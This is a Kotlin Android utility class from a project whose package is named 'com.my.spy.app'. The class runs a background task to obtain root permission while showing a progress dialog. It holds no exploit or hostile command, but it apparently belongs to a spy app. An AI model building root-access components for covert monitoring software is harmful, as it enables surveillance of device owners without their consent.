@file:Suppress("DEPRECATION", "DeprecatedCallableAddReplaceWith")

package com.my.spy.app.utils.async

import android.annotation.SuppressLint
import android.content.Context
import android.os.AsyncTask
import cn.pedant.SweetAlert.SweetAlertDialog
import com.my.spy.app.R
import com.my.spy.app.app.powerapk
import com.my.spy.app.utils.ConstFun.alertDialog


@Suppress("DEPRECATION")
@SuppressLint("StaticFieldLeak")
class AsyncTaskRootPermission(private val context: Context,private val result:(result:Boolean)->Unit) : AsyncTask<String, Boolean, Boolean>() {

    private var dialog :SweetAlertDialog?=null

    @Deprecated("Deprecated in Java")
    @Suppress("DEPRECATION")
    override fun onPreExecute() {
        super.onPreExecute()
        dialog = context.alertDialog(SweetAlertDialog.PROGRESS_TYPE, R.string.check_root_access,null,0){
            show()
        }
    }

    @Deprecated("Deprecated in Java")
    override fun doInBackground(vararg params: String?): Boolean = powerapk.root.obtainPermission()

    @Deprecated("Deprecated in Java")
    @Suppress("DEPRECATION")
    override fun onPostExecute(result: Boolean) {
        super.onPostExecute(result)
        if (dialog!=null) dialog!!.dismiss()
        result(result)
    }


}